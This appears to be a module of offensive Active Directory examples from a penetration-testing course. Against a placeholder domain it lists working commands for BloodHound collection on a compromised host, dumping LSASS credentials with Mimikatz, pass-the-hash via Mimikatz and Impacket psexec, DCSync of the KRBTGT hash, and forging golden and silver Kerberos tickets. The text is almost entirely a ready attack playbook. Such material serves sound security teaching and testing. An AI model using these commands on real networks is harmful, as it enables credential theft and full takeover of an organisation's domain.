# Module 18: Active Directory II Examples

## 1. BloodHound Execution

BloodHound helps visualize the shortest path to Domain Admin.

**Step 1: Collect Data (SharpHound)**
Run SharpHound on a compromised domain-joined machine.
```powershell
# Run the collector
Invoke-BloodHound -CollectionMethod All
# This generates a zip file with JSON data (e.g., 20260531000000_BloodHound.zip)
```

**Step 2: Analyze Data**
Start Neo4j, open the BloodHound GUI, and upload the zip file. Use queries like:
- "Find Shortest Paths to Domain Admins"
- "Find AS-REP Roastable Users"

## 2. Pass-the-Hash (PtH)

Using a compromised NTLM hash to authenticate without the plaintext password.

**Using Mimikatz:**
```cmd
# Dump hashes from LSASS (requires Administrator privileges)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Pass the hash to open a new command prompt as the victim user
mimikatz # sekurlsa::pth /user:Administrator /domain:globalcorp.local /ntlm:ab12cd34ef56gh78ij90kl12mn34op56 /run:cmd.exe
```

**Using Impacket (Linux):**
```bash
impacket-psexec -hashes :ab12cd34ef56gh78ij90kl12mn34op56 globalcorp.local/Administrator@10.10.10.200
```

## 3. Golden Ticket Attack

Forging a TGT that allows impersonation of any user in the domain. Requires the KRBTGT NTLM hash.

**Step 1: Steal the KRBTGT Hash (Requires Domain Admin on the DC)**
```cmd
mimikatz # lsadump::dcsync /domain:globalcorp.local /user:krbtgt
```
*Note the domain SID and the KRBTGT NTLM hash.*

**Step 2: Forge the Golden Ticket**
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:globalcorp.local /sid:S-1-5-21-123456789-123456789-123456789 /rc4:krbtgt_ntlm_hash_here /id:500 /ptt
```
*`/ptt` stands for Pass-the-Ticket, which injects it directly into the current session's memory.*

**Step 3: Access any resource**
```cmd
dir \\dc.globalcorp.local\C$
```

## 4. Silver Ticket Attack

Forging a TGS (Service Ticket) to access a specific service (e.g., CIFS for file sharing). Requires the NTLM hash of the target service account.

```cmd
mimikatz # kerberos::golden /domain:globalcorp.local /sid:S-1-5-21-123456789-123456789-123456789 /target:fileserver.globalcorp.local /service:cifs /rc4:service_account_ntlm_hash /user:Administrator /ptt
```
